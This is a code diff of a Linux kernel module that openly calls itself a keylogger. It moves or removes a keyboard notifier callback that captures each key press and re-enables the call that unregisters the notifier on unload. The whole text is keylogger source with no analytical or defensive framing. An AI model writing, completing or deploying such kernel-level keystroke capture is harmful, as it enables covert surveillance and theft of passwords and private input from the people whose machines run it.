@@ -8,23 +8,9 @@ MODULE_SUPPORTED_DEVICE("Not machine dependent");
 
 int key;
 int ret = 0;
-/**/
-int notifier(struct notifier_block *block, unsigned long code, void *p)
-{
-    struct keyboard_notifier_param *param;
-    param =(struct keyboard_notifier_param*) p;
-    /*needs to conect to the char dvice*/
-    if (code == KBD_KEYCODE && param->down)
-    {
-        update_key(param);
-    }
-    return NOTIFY_OK;
-}
+
+
 static struct notifier_block keylogger ={.notifier_call = notifier};
-
-
-
-
 
 
 static int __init MOD_LOAD(void)
@@ -51,9 +37,15 @@ static int __init MOD_LOAD(void)
 }
 static void __exit MOD_UNLOAD(void)
 {
-   // unregister_keyboard_notifier(&keylogger);
+   unregister_keyboard_notifier(&keylogger);
     driver_exit();
     printk(KERN_ALERT "Keylogger: unload the module");
 } 
+
+
+
+
+
+
 module_init(MOD_LOAD);
 module_exit(MOD_UNLOAD);
